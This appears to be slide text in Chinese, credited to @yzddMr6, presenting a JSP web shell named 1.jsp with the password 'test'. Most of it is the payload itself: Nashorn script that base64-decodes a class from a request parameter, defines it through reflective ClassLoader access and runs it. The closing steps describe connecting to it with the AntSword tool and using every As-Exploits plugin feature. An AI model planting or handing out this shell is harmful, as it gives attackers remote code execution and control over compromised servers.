1
新型句话连接原有句话
@yzddMr6
1.jsp
Payload
密码test
 1 
 2 
 1 try {
 2   load("nashorn:mozilla_compat.js");
 3 } catch (e) {}
 4 importPackage(Packages.java.util);
 5 importPackage(Packages.java.lang);
 6 importPackage(Packages.java.io);
 7 var output = new StringBuffer("");
 8 var cs = "UTF-8";
 9 response.setContentType("text/html");
10 request.setCharacterEncoding(cs);
11 response.setCharacterEncoding(cs);
12 function Base64DecodeToByte(str) {
13   importPackage(Packages.sun.misc);
14   importPackage(Packages.java.util);
15   var bt;
2
添加到蚁剑参数⾥
16   try {
17     bt = new BASE64Decoder().decodeBuffer(str);
18   } catch (e) {
19     bt = new Base64().getDecoder().decode(str);
20   }
21   return bt;
22 }
23 function defineShell(cls) {
24   var payload = Base64DecodeToByte(cls);
25   var loader = Thread.currentThread().getContextClassLoader();
26   var byteArray = Java.type("byte[]");
27   var int = Java.type("int");
28   var defineMethod = java.lang.ClassLoader.class.getDeclaredMetho
d(
29     "defineClass",
30     byteArray.class,
31     int.class,
32     int.class
33   );
34   defineMethod.setAccessible(true);
35   var constructor =
36     java.security.SecureClassLoader.class.getDeclaredConstructor(
37       ClassLoader.class
38     );
39   constructor.setAccessible(true);
40   var cl = constructor.newInstance(loader);
41   var c = defineMethod.invoke(cl, payload, 0, payload.length);
42   c.newInstance().equals(request);
43 }
44 defineShell(request.getParameter("test"));
3
修改密码为test，使⽤原有类型连接，连接成功
可以使⽤As-Exploits插件所有功能
4